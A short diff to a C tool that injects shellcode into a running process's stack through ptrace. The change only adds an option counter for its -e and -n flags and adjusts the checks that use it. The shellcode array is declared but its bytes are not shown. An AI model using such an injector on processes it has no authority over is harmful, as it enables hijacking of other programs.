@@ -19,7 +19,7 @@ char shellcode[] __attribute__((section(".myshellcode,\"awx\",@progbits#"))) = 	
 int main(int argc, char **argv)
 {
 	char *envVar, *name;
-	int c,i,size;
+	int c,i,size, options = 0;
 	unsigned long long int pointed;
 	pid_t pid;
 	struct user_regs_struct registers;
@@ -52,9 +52,11 @@ int main(int argc, char **argv)
         			break;
     			case 'e':
         			envVar = strdup(optarg);
+        			++options;
            			break;
     			case 'n':
         			name = strdup(optarg);
+        			++options;
        				break;
     			default:
     				usage();
@@ -62,7 +64,7 @@ int main(int argc, char **argv)
     		}	
 	}
 
-	if(!pid || (!envVar || !name))
+	if(!pid || (options != 2 && options != 0))
 	{
 		usage();
 	}
@@ -87,7 +89,7 @@ int main(int argc, char **argv)
 	printf("\n Press [Enter] to continue..\n\n");
 	getchar();
 
-	if(!envVar || !name)
+	if(!options)
 	{
 		size = sizeof(shellcode);
 		printf(" Injecting Shellcode into tracee's stack..\n");		
